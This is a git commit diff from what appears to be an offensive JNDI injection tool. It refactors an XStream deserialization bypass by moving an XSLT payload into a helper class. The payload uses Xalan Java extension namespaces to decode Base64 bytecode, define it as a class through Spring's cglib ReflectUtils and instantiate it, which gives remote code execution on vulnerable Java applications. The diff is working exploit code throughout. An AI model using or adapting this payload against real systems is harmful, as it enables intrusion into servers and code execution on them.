7055c6a0442d72d5cef6f61ef0676c0b99f9ddfd
X1r0z <i@exp10it.io>
2025-07-31 20:26:30 +0800

    refactor: 优化 XSLT Payload
    优化 XSLT Payload

--- src/main/java/map/jndi/controller/bypass/XStreamController.java
+++ src/main/java/map/jndi/controller/bypass/XStreamController.java
@@ -7,6 +7,7 @@ import javassist.bytecode.ClassFile;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
+import map.jndi.payload.XsltPayload;
 import map.jndi.template.XsltHelper;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
@@ -41,25 +42,7 @@ public class XStreamController extends BasicController {
         ReflectUtil.setCtField(helperClazz, "className", CtField.Initializer.constant(className));
         ReflectUtil.setCtField(helperClazz, "payload", CtField.Initializer.constant(Base64.getEncoder().encodeToString(byteCode)));
 
-        String xsltContent = "<xsl:stylesheet version=\"1.0\"" +
-                "  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"" +
-                "  xmlns:b64=\"http://xml.apache.org/xalan/java/java.util.Base64\"" +
-                "  xmlns:de=\"http://xml.apache.org/xalan/java/java.util.Base64$Decoder\"" +
-                "  xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"" +
-                "  xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"" +
-                "  xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"" +
-                "  xmlns:cls=\"http://xml.apache.org/xalan/java/java.lang.Class\"" +
-                "  exclude-result-prefixes=\"b64 de ob th ru cls\">" +
-                "  <xsl:template match=\"/\">" +
-                "    <xsl:variable name=\"dec\" select=\"b64:getDecoder()\"/>" +
-                "    <xsl:variable name=\"bs\" select=\"de:decode($dec, '" + Base64.getEncoder().encodeToString(helperClazz.toBytecode()) + "')\"/>" +
-                "    <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>" +
-                "    <xsl:variable name=\"clazz\" select=\"ru:defineClass('" + helperClassName + "', $bs, $cl)\"/>" +
-                "   <xsl:variable name=\"inst\" select=\"cls:newInstance($clazz)\"/>" +
-                "    <xsl:value-of select=\"$inst\"/>" +
-                "  </xsl:template>" +
-                "</xsl:stylesheet>";
-
+        String xsltContent = XsltPayload.loadClass(helperClassName, helperClazz.toBytecode());
         String payload = "<sorted-set>" +
                 "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                 "    <type>test</type>" +
---
+++ src/main/java/map/jndi/payload/XsltPayload.java
@@ -0,0 +1,26 @@
+package map.jndi.payload;
+
+import java.util.Base64;
+
+public class XsltPayload {
+    public static String loadClass(String className, byte[] byteCode) {
+        return "<xsl:stylesheet version=\"1.0\"" +
+                "  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"" +
+                "  xmlns:b64=\"http://xml.apache.org/xalan/java/java.util.Base64\"" +
+                "  xmlns:de=\"http://xml.apache.org/xalan/java/java.util.Base64$Decoder\"" +
+                "  xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"" +
+                "  xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"" +
+                "  xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"" +
+                "  xmlns:cls=\"http://xml.apache.org/xalan/java/java.lang.Class\"" +
+                "  exclude-result-prefixes=\"b64 de ob th ru cls\">" +
+                "  <xsl:template match=\"/\">" +
+                "    <xsl:variable name=\"dec\" select=\"b64:getDecoder()\"/>" +
+                "    <xsl:variable name=\"bs\" select=\"de:decode($dec, '" + Base64.getEncoder().encodeToString(byteCode) + "')\"/>" +
+                "    <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>" +
+                "    <xsl:variable name=\"clazz\" select=\"ru:defineClass('" + className + "', $bs, $cl)\"/>" +
+                "   <xsl:variable name=\"inst\" select=\"cls:newInstance($clazz)\"/>" +
+                "    <xsl:value-of select=\"$inst\"/>" +
+                "  </xsl:template>" +
+                "</xsl:stylesheet>";
+    }
+}
